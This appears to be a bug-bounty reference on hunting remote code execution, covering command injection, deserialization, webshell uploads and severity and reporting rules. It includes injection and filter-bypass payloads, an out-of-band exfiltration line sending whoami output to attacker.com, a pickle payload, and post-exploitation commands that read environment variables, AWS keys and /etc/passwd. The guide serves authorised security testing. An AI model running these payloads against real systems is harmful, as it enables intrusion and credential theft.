# RCE — Remote Code Execution Hunting Methodology

## Attack Vectors to Hunt

| Vector | Description | Priority |
|---|---|---|
| OS Command Injection | User input passed to shell without sanitization | Critical |
| Code Injection | User input evaluated as code (`eval`, `exec`) | Critical |
| Deserialization | Untrusted object deserialization | Critical |
| File Upload + Execution | Upload webshell to executable path | Critical |
| Template Injection (SSTI) | Template engine evaluates user input | Critical |
| XML / XXE → SSRF → RCE | XXE → internal service → code exec | Critical |
| Dependency Confusion / Supply Chain | Out of scope for most BB programs | N/A |

---

## 1. OS Command Injection

**Common Sinks:**
- `exec()`, `system()`, `popen()`, `subprocess()`, `shell_exec()`, `passthru()`
- Python: `os.system()`, `subprocess.run(shell=True)`, `eval()`
- Node.js: `child_process.exec()`, `child_process.spawn()` with shell=true

**Source Code Red Flags:**
```
# Python — vulnerable
os.system(f"ping {user_input}")
subprocess.run(f"convert {filename}", shell=True)

# PHP — vulnerable: user-controlled parameter concatenated into OS command function
# Exact sink names: exec(), passthru(), shell_exec() — see PayloadsAllTheThings RCE
exec("whois " . $ip);

# Node.js — vulnerable
exec(`git clone ${url}`)
```

**Injection Payloads (suggest to user):**
- Append command: `; id`, `| id`, `&& id`
- Backtick: `` `id` ``
- Newline: `%0a id`
- Blind (OOB): `; nslookup $(whoami).attacker.com`
- Blind time: `; sleep 5`

**Bypass Common Filters:**
- Space bypass: `${IFS}`, `{id}`, `%09` (tab)
- Slash bypass: `${PATH:0:1}` = `/`
- Quote bypass: mix single and double quotes

---

## 2. Deserialization RCE

**Languages to Target:**

| Language | Libraries/Formats | Attack Path |
|---|---|---|
| Java | `ObjectInputStream`, XStream, Jackson | Gadget chain → RCE |
| PHP | `unserialize()` | Magic methods → arbitrary code |
| Python | `pickle.loads()`, `yaml.load()` (unsafe) | `__reduce__` → OS command |
| Ruby | `Marshal.load()` | Gadget chain |
| Node.js | `node-serialize` | IIFE in JSON |
| .NET | `BinaryFormatter`, JSON.NET with TypeNameHandling | Gadget chain |

**Detection (suggest to user to look for):**
- Base64-encoded data in cookies or POST bodies that look like serialized objects
- Cookie values starting with `rO0` (Java), `O:` (PHP), or pickle magic bytes (`\x80\x04`)
- Endpoints that accept XML/YAML blobs
- APIs that accept raw object data and reflect it back

**PHP `unserialize` Quick Check:**
Inject `O:8:"stdClass":0:{}` — if it doesn't throw an error, deserialization is active.
Then test gadget chains from phpggc: `phpggc Laravel/RCE1 system id`

**Python `pickle` Confirm:**
Inject a pickle payload that triggers DNS: 
```python
import pickle, base64
class X:
    def __reduce__(self): return (os.system, ('nslookup attacker.com',))
```

---

## 3. File Upload → RCE

**Required Conditions:**
1. Can upload a file with attacker-controlled content
2. File is accessible at a predictable/discoverable URL
3. Server executes the uploaded file type (PHP, JSP, ASP, py)

**Attack Steps:**
1. Upload a PHP file (e.g., `shell.php`) containing a minimal code execution payload — a one-liner that passes a GET parameter to an OS command function (`system()`, `passthru()`, or `shell_exec()`). Exact working payloads: HackTricks "File Upload" or PayloadsAllTheThings "File Upload".
2. Find where the file is stored (observe URL in response, brute predictable path)
3. Access `https://target.com/uploads/shell.php?cmd=id`

**File Extension Bypass Techniques:**
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg` (older PHP)
- MIME confusion: send `image/jpeg` content-type with PHP content
- Capitalization: `shell.PHP`, `shell.Php`
- Less common ext: `.phtml`, `.php5`, `.phar`

**If no direct execution path:** Check if files are served through a PHP include or template engine that interprets them.

---

## 4. Template Injection → RCE

See `references/vulnerabilities/ssti.md` for full SSTI methodology. SSTI commonly escalates to RCE — use this path when template injection is confirmed.

---

## Impact Classification

| RCE Type | Severity |
|---|---|
| Unauthenticated OS command injection | Critical |
| Authenticated OS command injection (any user) | High-Critical |
| Deserialization RCE | Critical |
| File upload shell execution | Critical |
| RCE requiring admin login | High |
| Blind RCE (confirmed via OOB but no output) | High-Critical |

## Do Not Report
- Command injection in admin-only panels if only admins could ever reach it (check program scope)
- Injection that's filtered completely — test the bypass first
- File upload without confirmed execution path (LFI + upload is a separate chain)

## Evidence Requirements for RCE Reports
RCE is the highest severity — triagers expect:
1. **Exact vulnerable endpoint and parameter**
2. **Payload that triggers execution** (blind: OOB DNS; non-blind: `id` output)
3. **Full HTTP request** with payload
4. **Response or OOB evidence** proving execution
   - Blind RCE: use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh) (free) — `; nslookup $(whoami).YOUR-INTERACTSH-HOST`
5. **Impact statement:** "Attacker achieves arbitrary code execution as [OS user] on [server]"

## Post-RCE: Maximizing Impact Evidence
Once RCE is confirmed, collect these for your report to justify Critical severity:
- `id` — confirm OS user (root vs www-data changes severity framing)
- `cat /proc/self/environ` — environment variables, may contain cloud credentials
- `env | grep -i aws` — AWS keys if running in cloud environment
- `cat /etc/passwd` — user list (shows server context)
- `cat /proc/net/fib_trie` — internal IP ranges (demonstrates network access)
- `ls /home` — other user directories

Stop after confirming RCE — do NOT access production data, customer files, or modify anything.
